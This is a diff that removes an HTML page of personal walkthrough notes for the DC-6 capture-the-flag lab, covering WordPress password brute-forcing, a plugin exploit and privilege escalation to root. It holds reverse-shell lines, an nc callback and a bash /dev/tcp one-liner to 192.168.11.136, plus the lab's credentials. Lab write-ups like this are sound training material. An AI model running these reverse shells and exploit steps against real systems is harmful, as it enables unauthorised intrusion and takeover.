@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>DC-6</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>DC-6</h1><br/>added wordy to hosts file<br />ran normal nmap revieling 22 and 80 being openran nikto and dirsearch revealing it was wordpress with limited directories<br />nikto revealed it was word press so I ran wpscan<br />wpscan found 5 users so I sent them against wpscan -e and rockyou.txt<br />was able to get a password for mark! helpdesk01<br />In the left pane the WP site had a plugin “activity monitor”<br />searchsploit found an exploit for it at exploits/php/webapps/45274.html<br />after moving the exploit I changed the “localhost:8000” to wordy:80 and added proper call out with nc (nc 192.168.11.136 3232)<br />I then started a listener<br />from there I simply opened a web browser and in the uri bar I hit ctrl-o and opened the modified .html exploit<br />listener created!!<br /><br />after a short amount of snooping I found a file named “things to do” in marks home and it had creds for graham. GSo7isUM1D4<br />ssh&#39;d into graham&#39;s account and found that I could run backup.sh in jens home as jens.<br />I edited the file to have a bash call back              bash -i &gt;&amp; /dev/tcp/192.168.11.136/3233 0&gt;&amp;1<br />started a nc listener<br />sudo -u jens /home/jens/backups.sh<br />now I have a shell as jens!!<br /><br />sudo -l             and I saw that I could run nmap as root<br />went to gtfobins and found an exploit<br />became root!!!<br /></div></body></html>
